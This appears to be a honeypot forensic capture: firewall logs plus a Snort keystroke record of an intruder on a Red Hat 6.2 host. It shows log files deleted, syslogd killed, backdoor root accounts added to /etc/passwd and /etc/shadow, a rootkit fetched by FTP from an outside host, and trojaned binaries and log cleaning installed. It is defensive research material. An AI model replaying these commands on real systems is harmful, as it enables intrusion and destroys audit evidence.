@@ -1,0 +1,3490 @@
+##### THE BLACKHAT TAKES CONTROL #####
+The blackhat connects to the honeypot and takes
+control of the system.
+
+Firewall-1 logs
+---------------
+Here the firewall logs all of the blackhats inbound and outbound
+connection from the honeypot victim7-int (apollo.honeyp.edu).
+
+### Inbound connections:
+8Nov2000  7:31:15 accept firewall   >qfe1 useralert proto tcp src c871553-b.jffsn1.mo.home.com dst victim7-ext service telnet s_port 4676 len 60 rule 9 xlatesrc c871553-b.jffsn1.mo.home.com xlatedst victim7-int xlatesport 4676 xlatedport telnet
+8Nov2000  7:48:10 accept firewall   >qfe1 useralert proto tcp src c871553-b.jffsn1.mo.home.com dst victim7-ext service telnet s_port 4677 len 60 rule 9 xlatesrc c871553-b.jffsn1.mo.home.com xlatedst victim7-int xlatesport 4677 xlatedport telnet
+8Nov2000  8:05:15 accept firewall   >qfe1 useralert proto tcp src c871553-b.jffsn1.mo.home.com dst victim7-ext service ssh s_port 1023 len 60 rule 9 xlatesrc c871553-b.jffsn1.mo.home.com xlatedst victim7-int xlatesport 1023 xlatedport ssh
+
+### Outbound connection
+8Nov2000  7:32:43 accept firewall   >qfe0 alert proto tcp src victim7-int dst cc784302-a.hwrd1.md.home.com service ftp s_port 1025 len 60 rule 16 xlatesrc victim7-ext xlatedst cc784302-a.hwrd1.md.home.com xlatesport 1025 xlatedport ftp
+8Nov2000  7:57:18 accept firewall   >qfe0 alert proto udp src victim7-int dst a.root-servers.net service domain s_port 1037 len 45 rule 16 xlatesrc victim7-ext xlatedst a.root-servers.net xlatesport 1037 xlatedport domain
+8Nov2000  7:59:18 accept firewall   >qfe0 alert proto tcp src victim7-int dst irc.Stanford.EDU service 6667 s_port 1028 len 60 rule 16 xlatesrc victim7-ext xlatedst irc.Stanford.EDU xlatesport 1028 xlatedport 6667
+8Nov2000  8:23:49 accept firewall   >qfe0 alert proto udp src victim7-int dst f.root-servers.net service domain s_port 1037 len 64 rule 16 xlatesrc victim7-ext xlatedst f.root-servers.net xlatesport 1037 xlatedport domain
+8Nov2000  8:23:52 reject firewall   >qfe0 alert proto udp src victim7-int dst victim7-ext service domain s_port 1037 len 64 rule sam xlatesrc victim7-ext xlatedst victim7-ext xlatesport 1037 xlatedport domain
+
+Snort Capture
+-------------
+Here snort captures all of the blackhats keystrokes.
+
+*** Connect to backdoor on port 4545 from c871553-b.jffsn1.mo.home.com, 8 Nov, 07:30 ***
+
+  bash# uptime
+  uptime
+  8:25am  up 2 days, 22:52,  0 users,  load average: 0.00, 0.00, 0.00
+  bash# 
+  bash# rm -rf /etc/hosts.deny
+  rm -rf /etc/hosts.deny
+  bash# 
+  bash# touch /etc/hosts.deny
+  touch /etc/hosts.deny
+  bash# 
+  bash# rm -rf /var/log/wtmp
+  rm -rf /var/log/wtmp
+  bash# 
+  bash# touch /var/log/wtmp
+  touch /var/log/wtmp
+  bash# 
+  bash# 
+
+  bash# 
+  bash# killall -9 klogd
+  killall -9 klogd
+  bash# 
+  bash# killall -9 syslogd
+  killall -9 syslogd
+  bash# 
+  bash# rm -rf /etc/rc.d/init.d/*log*
+  rm -rf /etc/rc.d/init.d/*log*
+  bash# 
+  bash# echo own:x:0:0::/root:/bin/bash >> /etc/passwd
+  echo own:x:0:0::/root:/bin/bash >> /etc/passwd
+  bash# 
+  bash# echo adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash >> /etc/passwd
+  echo adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash >> /etc/passwd
+  bash# 
+  bash# echo own::10865:0:99999:7:-1:-1:134538460 >> /etc/shadow
+  echo own::10865:0:99999:7:-1:-1:134538460 >> /etc/shadow
+  bash# 
+  bash# echo adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412 >> /etc/shadow
+  echo adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412 >> /etc/shadow
+  bash# 
+  bash# cat /etc/inetd.conf | grep tel
+  cat /etc/inetd.conf | grep tel
+  telnetstream  tcp nowait  root    /usr/sbin/tcpdin.telnetd
+  bash# 
+  bash# exit
+
+*** Telnet in from c871553-b.jffsn1.mo.home.com at 8 Nov, 07:31 ***
+
+ !"' #'!"#P ' 38400,38400'VT100
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i586
+login: adm1
+Password: eliteness
+
+bash$ su own
+[root@apollo /tmp]# ps aux
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1  1120  120 ?        S    Nov05   0:06 init [3]
+root         2  0.0  0.0     0    0 ?        SW   Nov05   0:00 [kflushd]
+root         3  0.0  0.0     0    0 ?        SW   Nov05   0:00 [kupdate]
+root         4  0.0  0.0     0    0 ?        SW   Nov05   0:00 [kpiod]
+root         5  0.0  0.0     0    0 ?        SW   Nov05   0:00 [kswapd]
+root         6  0.0  0.0     0    0 ?        SW<  Nov05   0:00 [mdrecoveryd]
+bin        245  0.0  0.5  1216  368 ?        S    Nov05   0:00 portmap
+root       260  0.0  0.0     0    0 ?        SW   Nov05   0:00 [lockd]
+root       261  0.0  0.0     0    0 ?        SW   Nov05   0:00 [rpciod]
+root       284  0.0  0.0  1104    0 ?        SW   Nov05   0:00 [apmd]
+nobody     358  0.0  0.0  1292   44 ?        S    Nov05   0:00 [identd]
+nobody     361  0.0  0.0  1292   44 ?        S    Nov05   0:00 [identd]
+nobody     362  0.0  0.0  1292   44 ?        S    Nov05   0:00 [identd]
+nobody     364  0.0  0.0  1292   44 ?        S    Nov05   0:00 [identd]
+nobody     365  0.0  0.0  1292   44 ?        S    Nov05   0:00 [identd]
+daemon     376  0.0  0.1  1144  104 ?        S    Nov05   0:00 /usr/sbin/atd
+root       390  0.0  0.2  1328  188 ?        S    Nov05   0:00 crond
+root       408  0.0  0.6  1156  400 ?        S    Nov05   0:00 inetd
+root       422  0.0  0.0  1204    0 ?        SW   Nov05   0:00 [lpd]
+root       466  0.0  0.4  2128  296 ?        S    Nov05   0:00 sendmail: accepti
+root       481  0.0  0.0  1144   20 ?        S    Nov05   0:00 gpm -t ps/2
+root       495  0.0  0.0  6036   48 ?        S    Nov05   0:01 httpd
+nobody     518  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     519  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     520  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     521  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     522  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     523  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     524  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+nobody     525  0.0  0.0  6132    0 ?        SW   Nov05   0:00 [httpd]
+xfs        535  0.0  0.0  1728   60 ?        S    Nov05   0:00 xfs -droppriv -da
+root       576  0.0  0.0  1092    0 tty2     SW   Nov05   0:00 [mingetty]
+root       577  0.0  0.0  1092    0 tty3     SW   Nov05   0:00 [mingetty]
+root       578  0.0  0.0  1092    0 tty4     SW   Nov05   0:00 [mingetty]
+root       579  0.0  0.0  1092    0 tty5     SW   Nov05   0:00 [mingetty]
+root       580  0.0  0.0  1092    0 tty6     SW   Nov05   0:00 [mingetty]
+root       683  0.0  0.6  1092  408 tty1     S    Nov05   0:00 /sbin/mingetty tt
+root      2387  0.0  1.1  1464  756 ?        S    08:28   0:00 in.telnetd: c8715
+root      2388  0.3  2.1  2308 1344 pts/0    S    08:28   0:00 login -- adm1    
+adm1      2389  0.1  1.4  1692  932 pts/0    S    08:28   0:00 -bash
+root      2404  0.6  1.4  2156  932 pts/0    S    08:29   0:00 su own
+root      2405  0.3  1.4  1700  936 pts/0    S    08:29   0:00 bash
+root      2415  0.0  1.2  2500  816 pts/0    R    08:29   0:00 ps aux
+[root@apollo /tmp]# ftp
+ftp> open  24.9.159.26
+Connected to 24.9.159.26.
+220 skipper.robotics.net FTP server (Version wu-2.6.1(3) Tue Aug 8 01:00:03 PDT 2000) ready.
+Name (24.9.159.26:adm1): ttestest
+331 Password required for test.
+Password:eliteness
+230 User test logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd /tmp/...
+250 CWD command successful.
+ftp> get Ci.tar 
+local: Ci.tar remote: Ci.tar
+200 PORT command successful.
+150 Opening BINARY mode data connection for Ci.tar (12748800 bytes).
+226 Transfer complete.
+12748800 bytes received in 1.02e+03 secs (12 Kbytes/sec)
+ftp> get tpack23-ef.tgz
+local: tpack23-ef.tgz remote: tpack23-ef.tgz
+200 PORT command successful.
+150 Opening BINARY mode data connection for tpack23-ef.tgz (619483 bytes).
+150 Opening BINARY mode data connection for tpack23-ef.tgz (619483 bytes).
+226 Transfer complete.
+619483 bytes received in 44 secs (14 Kbytes/sec)
+ftp> quit
+221-You have transferred 13368283 bytes in 2 files.
+221-Total traffic for this session was 13368928 bytes in 2 transfers.
+221-Thank you for using the FTP service on skipper.robotics.net.
+221 Goodbye.
+[root@apollo /tmp]# mv Ci.tar /usr/man;cd /usr/man;tar -xvf Ci*;cd .Ci
+.Ci/
+.Ci/rpms.tgz
+.Ci/ssh-1.2.27.tgz
+.Ci/install-sshd1
+.Ci/install-sshd
+.Ci/install-named
+.Ci/install
+.Ci/snif
+.Ci/a.sh
+.Ci/named.tgz
+.Ci/sp.pl
+.Ci/qs
+.Ci/addbd
+.Ci/netstat
+.Ci/syslogd
+.Ci/in.identd
+.Ci/inetd
+.Ci/tcpd
+.Ci/ls
+.Ci/top
+.Ci/ps
+.Ci/clean
+.Ci/scan/
+.Ci/scan/amd/
+.Ci/scan/amd/amdx
+.Ci/scan/amd/ben.c
+.Ci/scan/amd/ben
+.Ci/scan/amd/pscan
+.Ci/scan/amd/pscan.c
+.Ci/scan/amd/a.sh
+.Ci/scan/bind/
+.Ci/scan/bind/ibind.sh
+.Ci/scan/bind/pscan.c
+.Ci/scan/x/
+.Ci/scan/x/x
+.Ci/scan/x/xscan
+.Ci/scan/x/xfil
+.Ci/scan/x/pscan.c
+.Ci/scan/x/pscan
+.Ci/scan/wu/
+.Ci/scan/wu/wu
+.Ci/scan/wu/fs
+.Ci/scan/port/
+.Ci/scan/port/strobe/
+.Ci/scan/port/strobe/INSTALL
+.Ci/scan/port/strobe/Makefile
+.Ci/scan/port/strobe/VERSION
+.Ci/scan/port/strobe/strobe.1
+.Ci/scan/port/strobe/strobe.c
+.Ci/scan/port/strobe/strobe.services
+.Ci/scan/daemon/
+.Ci/scan/daemon/z0ne
+.Ci/scan/daemon/lscan2.c
+.Ci/scan/statd/
+.Ci/scan/statd/r
+.Ci/scan/statd/statdx
+.Ci/top
+.Ci/ps
+.Ci/clean
+.Ci/scan/
+.Ci/scan/amd/
+.Ci/scan/amd/amdx
+.Ci/scan/amd/ben.c
+.Ci/scan/amd/ben
+.Ci/scan/amd/pscan
+.Ci/scan/amd/pscan.c
+.Ci/scan/amd/a.sh
+.Ci/scan/bind/
+.Ci/scan/bind/ibind.sh
+.Ci/scan/bind/pscan.c
+.Ci/scan/x/
+.Ci/scan/x/x
+.Ci/scan/x/xscan
+.Ci/scan/x/xfil
+.Ci/scan/x/pscan.c
+.Ci/scan/x/pscan
+.Ci/scan/wu/
+.Ci/scan/wu/wu
+.Ci/scan/wu/fs
+.Ci/scan/port/
+.Ci/scan/port/strobe/
+.Ci/scan/port/strobe/INSTALL
+.Ci/scan/port/strobe/Makefile
+.Ci/scan/port/strobe/VERSION
+.Ci/scan/port/strobe/strobe.1
+.Ci/scan/port/strobe/strobe.c
+.Ci/scan/port/strobe/strobe.services
+.Ci/scan/daemon/
+.Ci/scan/daemon/z0ne
+.Ci/scan/daemon/lscan2.c
+.Ci/scan/statd/
+.Ci/scan/statd/r
+.Ci/scan/statd/statdx
+.Ci/scan/statd/classb
+.Ci/snap
+.Ci/ptyp
+.Ci/q
+.Ci/pstree
+.Ci/killall
+.Ci/ifconfig
+.Ci/fix
+.Ci/addps
+.Ci/find
+.Ci/do
+.Ci/addn
+.Ci/paki/
+.Ci/paki/slice2
+.Ci/paki/stream.c
+.Ci/ /
+.Ci/ /Anap
+.Ci/rmS
+.Ci/bx
+.Ci/in.ftpd
+.Ci/chmod-it
+.Ci/needz
+.Ci/install-statd
+.Ci/nfs-utils-0.1.9.1-1.i386.rpm
+.Ci/wuftpd.rpm
+.Ci/install-wu
+[root@apollo .Ci]# cd /usr/man
+[root@apollo man]# ls
+Ci.tar  man2  man4  man6  man8  manl  tmac.h
+man1    man3  man5  man7  man9  mann  whatis
+[root@apollo man]# rm Ci.tar
+rm: remove `Ci.tar'? y
+[root@apollo man]# cd .Ci
+[root@apollo .Ci]# ls
+          find           install-sshd1                 paki      snap
+a.sh      fix            install-statd                 ps        snif
+addbd     ifconfig       install-wu                    pstree    sp.pl
+addn      in.ftpd        killall                       ptyp      ssh-1.2.27.tgz
+addps     in.identd      ls                            q         syslogd
+bx        inetd          named.tgz                     qs        tcpd
+
+          find           install-sshd1                 paki      snap
+a.sh      fix            install-statd                 ps        snif
+addbd     ifconfig       install-wu                    pstree    sp.pl
+addn      in.ftpd        killall                       ptyp      ssh-1.2.27.tgz
+addps     in.identd      ls                            q         syslogd
+bx        inetd          named.tgz                     qs        tcpd
+chmod-it  install        needz                         rmS       top
+clean     install-named  netstat                       rpms.tgz  wuftpd.rpm
+do        install-sshd   nfs-utils-0.1.9.1-1.i386.rpm  scan
+[m[root@apollo .Ci]# ./install
+cp: /usr/sbin/syslogd: No such file or directory
+Trojaning in progress
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /bin/ps fixed
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /usr/bin/top fixed
+fix: Can't open /usr/sbin/syslogd
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /bin/ls fixed
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /sbin/ifconfig fixed
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /bin/netstat fixed
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /usr/sbin/tcpd fixed
+fix: Last 17 bytes not zero
+fix: Can't fix checksum
+fix: File /usr/sbin/in.identd fixed
+syslogd: no process killed
+adding ps, tcpd, and ls hide files
+Editing Ps bd files first
+Editing tcpd bd files
+done with the tcpd, ls, and ps files
+Sniffer ENABLED
+running clean and a.sh
+echoing ip's and shit
+snap'ping
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing sshd out of /var/log/secure
+Editing sshd out of /var/log/messages
+Editing sshd out of /var/log/xferlog
+Editing sshd out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing sshd out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing sshd out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+sshd removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing log out of /var/log/secure
+Editing log out of /var/log/messages
+Editing log out of /var/log/xferlog
+Editing log out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing log out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing log out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+log removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing games out of /var/log/secure
+Editing games out of /var/log/messages
+Editing games out of /var/log/xferlog
+Editing games out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing games out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing games out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+games removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing 209.86 out of /var/log/secure
+Editing 209.86 out of /var/log/messages
+Editing 209.86 out of /var/log/xferlog
+Editing 209.86 out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing 209.86 out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing 209.86 out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+209.86 removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing own out of /var/log/secure
+Editing own out of /var/log/messages
+Editing own out of /var/log/xferlog
+Editing own out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing own out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing own out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+own removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing owned out of /var/log/secure
+Editing owned out of /var/log/messages
+Editing owned out of /var/log/xferlog
+Editing owned out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing owned out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing owned out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+owned removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing Pro out of /var/log/secure
+Editing Pro out of /var/log/messages
+Editing Pro out of /var/log/xferlog
+Editing Pro out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing Pro out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing Pro out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+Pro removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing snif out of /var/log/secure
+Editing snif out of /var/log/messages
+Editing snif out of /var/log/xferlog
+Editing snif out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing snif out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing snif out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+snif removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing ident out of /var/log/secure
+Editing ident out of /var/log/messages
+Editing ident out of /var/log/xferlog
+Editing ident out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing ident out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing ident out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+ident removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing splitrock out of /var/log/secure
+Editing splitrock out of /var/log/messages
+Editing splitrock out of /var/log/xferlog
+Editing splitrock out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing splitrock out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing splitrock out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+splitrock removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing 209.255 out of /var/log/secure
+Editing 209.255 out of /var/log/messages
+Editing 209.255 out of /var/log/xferlog
+Editing 209.255 out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing 209.255 out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing 209.255 out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+209.255 removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing 209.255 out of /var/log/secure
+Editing 209.255 out of /var/log/messages
+Editing 209.255 out of /var/log/xferlog
+Editing 209.255 out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing 209.255 out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing 209.255 out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+209.255 removed from all logs
+Enter your next host, leave blank to quit
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+Editing echo out of /var/log/secure
+Editing echo out of /var/log/messages
+Editing echo out of /var/log/xferlog
+Editing echo out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing echo out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing echo out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+echo removed from all logs
+Enter your next host, leave blank to quit
+done
+killing gay shit
+rpc.statd: no process killed
+rpc.rquoatd: no process killed
+nfsd: no process killed
+smbd: no process killed
+nmbd: no process killed
+amd: no process killed
+amq: no process killed
+rpc.mountd: no process killed
+rpc.portmap: no process killed
+rpc.nfsd: no process killed
+smbd: no process killed
+nmbd: no process killed
+snmpd: no process killed
+ypasswd: no process killed
+rpc.rusersd: no process killed
+ypserv: no process killed
+complete.
+rpms/
+rpms/am-utils-6.0.1s11-1.6.0.i386.rpm
+rpms/lpr-0.48-1.i386.rpm
+rpms/screen-3.9.4-3.i386.rpm
+rpms/telnet-0.10-29.i386.rpm
+rpms/ypserv-1.3.9-1.i386.rpm
+rpms/make-3.77-6.i386.rpm
+am-utils                    ##################################################
+lpr                         ##################################################
+make                        ##################################################
+screen                      ##################################################
+telnet                      ##################################################
+ypserv                      ##################################################
+done with installing shit
+i'll now run whereis sshd
+if nothing shows up then run ./install-sshd
+if it's in /usr/local/sbin/sshd then run ./install-sshd
+if it's in /usr/sbin/sshd then run ./install-sshd1
+sshd:
+after successfully installing sshd, run ./do
+rootkit installation complete.
+[root@apollo .Ci]# ./install-sshd
+installing sshd
+ssh-1.2.27/
+ssh-1.2.27/COPYING
+ssh-1.2.27/README
+ssh-1.2.27/README.SECURID
+ssh-1.2.27/README.TIS
+ssh-1.2.27/README.SECURERPC
+ssh-1.2.27/README.CIPHERS
+ssh-1.2.27/README.DEATTACK
+ssh-1.2.27/INSTALL
+ssh-1.2.27/TODO
+ssh-1.2.27/libdes-README
+ssh-1.2.27/libdes-COPYING
+ssh-1.2.27/libdes-ARTISTIC
+ssh-1.2.27/gnu-COPYING-GPL
+ssh-1.2.27/OVERVIEW
+ssh-1.2.27/configure
+ssh-1.2.27/configure.in
+ssh-1.2.27/config.guess
+ssh-1.2.27/config.sub
+ssh-1.2.27/Makefile.in
+ssh-1.2.27/host_config.sample
+ssh-1.2.27/config.sample
+ssh-1.2.27/acconfig.h
+ssh-1.2.27/config.h.in
+ssh-1.2.27/server_config.sample
+ssh-1.2.27/install-sh
+ssh-1.2.27/make-ssh-known-hosts.pl
+ssh-1.2.27/RFC.nroff
+ssh-1.2.27/RFC
+ssh-1.2.27/rfc-pg.c
+ssh-1.2.27/ChangeLog
+ssh-1.2.27/ssh.1.in
+ssh-1.2.27/ssh-keygen.1
+ssh-1.2.27/ssh-agent.1
+ssh-1.2.27/ssh-add.1
+ssh-1.2.27/scp.1
+ssh-1.2.27/make-ssh-known-hosts.1.in
+ssh-1.2.27/sshd.8.in
+ssh-1.2.27/sshd.c
+ssh-1.2.27/auth-rhosts.c
+ssh-1.2.27/auth-passwd.c
+ssh-1.2.27/auth-rsa.c
+ssh-1.2.27/auth-rh-rsa.c
+ssh-1.2.27/pty.c
+ssh-1.2.27/log-server.c
+ssh-1.2.27/login.c
+ssh-1.2.27/hostfile.c
+ssh-1.2.27/canohost.c
+ssh-1.2.27/servconf.c
+ssh-1.2.27/tildexpand.c
+ssh-1.2.27/serverloop.c
+ssh-1.2.27/idea.c
+ssh-1.2.27/rsa.c
+ssh-1.2.27/randoms.c
+ssh-1.2.27/md5.c
+ssh-1.2.27/buffer.c
+ssh-1.2.27/emulate.c
+ssh-1.2.27/packet.c
+ssh-1.2.27/compress.c
+ssh-1.2.27/xmalloc.c
+ssh-1.2.27/ttymodes.c
+ssh-1.2.27/newchannels.c
+ssh-1.2.27/bufaux.c
+ssh-1.2.27/authfd.c
+ssh-1.2.27/authfile.c
+ssh-1.2.27/crc32.c
+ssh-1.2.27/rsaglue.c
+ssh-1.2.27/cipher.c
+ssh-1.2.27/des.c
+ssh-1.2.27/match.c
+ssh-1.2.27/arcfour.c
+ssh-1.2.27/mpaux.c
+ssh-1.2.27/userfile.c
+ssh-1.2.27/signals.c
+ssh-1.2.27/blowfish.c
+ssh-1.2.27/deattack.c
+ssh-1.2.27/sshsia.c
+ssh-1.2.27/ssh.c
+ssh-1.2.27/sshconnect.c
+ssh-1.2.27/log-client.c
+ssh-1.2.27/readconf.c
+ssh-1.2.27/readpass.c
+ssh-1.2.27/clientloop.c
+ssh-1.2.27/ssh-keygen.c
+ssh-1.2.27/ssh-agent.c
+ssh-1.2.27/ssh-add.c
+ssh-1.2.27/scp.c
+ssh-1.2.27/ssh-askpass.c
+ssh-1.2.27/memmove.c
+ssh-1.2.27/snprintf.c
+ssh-1.2.27/strerror.c
+ssh-1.2.27/remove.c
+ssh-1.2.27/random.c
+ssh-1.2.27/putenv.c
+ssh-1.2.27/crypt.c
+ssh-1.2.27/socketpair.c
+ssh-1.2.27/auth-kerberos.c
+ssh-1.2.27/cipher.h
+ssh-1.2.27/getput.h
+ssh-1.2.27/pty.h
+ssh-1.2.27/arcfour.h
+ssh-1.2.27/compress.h
+ssh-1.2.27/idea.h
+ssh-1.2.27/randoms.h
+ssh-1.2.27/ttymodes.h
+ssh-1.2.27/authfd.h
+ssh-1.2.27/crc32.h
+ssh-1.2.27/includes.h
+ssh-1.2.27/readconf.h
+ssh-1.2.27/userfile.h
+ssh-1.2.27/blowfish.h
+ssh-1.2.27/des.h
+ssh-1.2.27/md5.h
+ssh-1.2.27/rsa.h
+ssh-1.2.27/version.h
+ssh-1.2.27/bufaux.h
+ssh-1.2.27/mpaux.h
+ssh-1.2.27/servconf.h
+ssh-1.2.27/xmalloc.h
+ssh-1.2.27/buffer.h
+ssh-1.2.27/emulate.h
+ssh-1.2.27/packet.h
+ssh-1.2.27/ssh.h
+ssh-1.2.27/deattack.h
+ssh-1.2.27/snprintf.h
+ssh-1.2.27/sshsia.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/
+ssh-1.2.27/gmp-2.0.2-ssh-2/README
+ssh-1.2.27/gmp-2.0.2-ssh-2/COPYING.LIB
+ssh-1.2.27/gmp-2.0.2-ssh-2/ChangeLog
+ssh-1.2.27/gmp-2.0.2-ssh-2/INSTALL
+ssh-1.2.27/gmp-2.0.2-ssh-2/Makefile.am
+ssh-1.2.27/gmp-2.0.2-ssh-2/Makefile.in
+ssh-1.2.27/gmp-2.0.2-ssh-2/NEWS
+ssh-1.2.27/gmp-2.0.2-ssh-2/aclocal.m4
+ssh-1.2.27/gmp-2.0.2-ssh-2/config.guess
+ssh-1.2.27/gmp-2.0.2-ssh-2/config.sub
+ssh-1.2.27/gmp-2.0.2-ssh-2/configure
+ssh-1.2.27/gmp-2.0.2-ssh-2/configure.in
+ssh-1.2.27/gmp-2.0.2-ssh-2/install-sh
+ssh-1.2.27/gmp-2.0.2-ssh-2/missing
+ssh-1.2.27/gmp-2.0.2-ssh-2/mkinstalldirs
+ssh-1.2.27/gmp-2.0.2-ssh-2/random.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/texinfo.tex
+ssh-1.2.27/gmp-2.0.2-ssh-2/memory.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_set_fns.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_clz_tab.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/version.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/stack-alloc.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_bpl.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/extract-double.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/insert-double.c
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-impl.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/longlong.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/stack-alloc.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/urandom.h
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp.texi
+ssh-1.2.27/gmp-2.0.2-ssh-2/PROJECTS
+ssh-1.2.27/gmp-2.0.2-ssh-2/SPEED
